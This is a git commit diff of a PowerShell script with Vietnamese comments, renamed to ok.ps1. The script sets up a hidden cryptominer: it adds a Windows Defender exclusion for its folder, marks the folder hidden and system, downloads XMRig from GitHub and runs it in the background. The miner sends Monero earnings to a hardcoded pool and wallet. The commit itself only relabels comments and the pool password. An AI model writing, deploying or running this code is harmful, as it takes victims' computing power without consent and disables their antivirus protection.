32794eab0cf9730bd5cd2c83053264cafc101bb0
43a1723 <hai1723notgay@gmail.com>
2025-02-06 20:37:41 +0700

    Update and rename ayuly.ps1 to ok.ps1

--- ok.ps1
+++ ok.ps1
@@ -5,7 +5,7 @@ New-Item -ItemType Directory -Path $dir
 Add-MpPreference -ExclusionPath $dir
 attrib +h +s $dir
 
-# tải miner cho ayuly
+# tải miner cho SkibiditoiletMiner
 $url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip"
 $zipPath = "$dir\xmrig.zip"
 Invoke-WebRequest -Uri $url -OutFile $zipPath
@@ -13,5 +13,5 @@ Expand-Archive -Path $zipPath -DestinationPath $dir -Force
 
 $miner = "$dir\xmrig-6.21.0"
 
-# nạp donate cho ayuly
-& "$miner\xmrig.exe" --donate-level 1 -o de.monero.herominers.com:1111 -u "48rJxia4YFjiAZsQ7fCS2CLRBbjDQj2iL8LptnzWseJ15oyZ4By5ktC73gcTpeiUXiaqaY8FuD3Mq5Qb2eUAR8xY4KrNJtG" -p "ayulyminer" -a rx/0 -k --background
+# nạp donate cho SkibiditoiletMiner
+& "$miner\xmrig.exe" --donate-level 1 -o de.monero.herominers.com:1111 -u "48rJxia4YFjiAZsQ7fCS2CLRBbjDQj2iL8LptnzWseJ15oyZ4By5ktC73gcTpeiUXiaqaY8FuD3Mq5Qb2eUAR8xY4KrNJtG" -p "SkibiditoiletMinerminer" -a rx/0 -k --background
